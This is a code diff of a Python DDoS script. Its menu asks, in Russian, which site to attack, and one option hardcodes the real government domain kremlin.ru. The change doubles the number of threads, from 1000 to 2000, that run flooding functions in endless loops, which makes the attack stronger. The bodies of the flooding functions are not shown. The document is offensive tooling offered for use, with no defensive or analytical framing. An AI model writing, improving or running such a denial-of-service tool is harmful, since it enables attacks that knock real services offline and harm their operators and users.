@@ -10,9 +10,9 @@ k = input("\nВыберите сайт для DDoS-атаки: ")
 if k == '1':
     #os.system('cls')
     site = 'kremlin.ru'
-    t = [None] *1000
-    a = [None] *1000
-    l = [None] *1000
+    t = [None] *2000
+    a = [None] *2000
+    l = [None] *2000
 
     F = '\033[91m'
     E = '\033[0m'
@@ -45,11 +45,11 @@ if k == '1':
 	    while 1:
 		    dos()
 
-    for i in range(1000):
+    for i in range(2000):
 	    t[i] = threading.Thread(target=dos)
-    for h in range(1000):
+    for h in range(2000):
 	    l[h] = threading.Thread(target=dos2)
-    for k in range(1000):
+    for k in range(2000):
 	    t[k].start()
 	    l[k].start()
 
